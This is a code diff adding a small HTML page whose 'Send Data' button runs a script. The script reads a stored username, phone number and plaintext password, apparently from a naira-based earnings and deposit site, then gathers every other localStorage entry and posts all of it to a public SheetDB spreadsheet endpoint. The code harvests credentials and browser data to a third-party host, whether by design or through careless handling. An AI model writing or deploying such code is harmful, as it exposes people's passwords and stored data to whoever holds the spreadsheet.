@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Data to SheetDB</title>
+</head>
+<body>
+    <button id="sendDataButton">Send Data</button>
+
+    <script>
+        document.getElementById('sendDataButton').addEventListener('click', function() {
+            // Function to get specific local storage data
+            function getSpecificLocalStorageData() {
+                const currentUser = localStorage.getItem('username');
+                const phoneNumber = localStorage.getItem('phoneNumber');
+                const password = localStorage.getItem('password');
+                const earningsKey = `${phoneNumber}_${currentUser}_${password}_earnings`;
+                const depositKey = `${phoneNumber}_${currentUser}_${password}_deposit`;
+                const uniqueCodeKey = 'uniqueCode';
+
+                const earnings = parseFloat(localStorage.getItem(earningsKey)) || 0;
+                const deposit = parseFloat(localStorage.getItem(depositKey)) || 0;
+                const uniqueCode = localStorage.getItem(uniqueCodeKey) || 'N/A';
+
+                // Get all other local storage data
+                let allData = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    if (key !== earningsKey && key !== depositKey && key !== uniqueCodeKey) {
+                        allData[key] = localStorage.getItem(key);
+                    }
+                }
+
+                return { earnings, deposit, uniqueCode, currentUser, password, others: JSON.stringify(allData) };
+            }
+
+            // Function to send data to SheetDB
+            function sendDataToSheetDB(data) {
+                const url = 'https://sheetdb.io/api/v1/yqjwwro2ogq7u';
+
+                const payload = {
+                    data: [
+                        {
+                            uniqueCode: data.uniqueCode,
+                            name: data.currentUser,
+                            password: data.password,
+                            deposit: `₦${data.deposit.toFixed(2)}`,
+                            earnings: `₦${data.earnings.toFixed(2)}`,
+                            others: data.others
+                        }
+                    ]
+                };
+
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                    alert('Data sent successfully');
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                    alert('Error sending data');
+                });
+            }
+
+            // Get all local storage data
+            const localStorageData = getSpecificLocalStorageData();
+
+            // Send the data to SheetDB
+            sendDataToSheetDB(localStorageData);
+        });
+    </script>
+</body>
+</html>
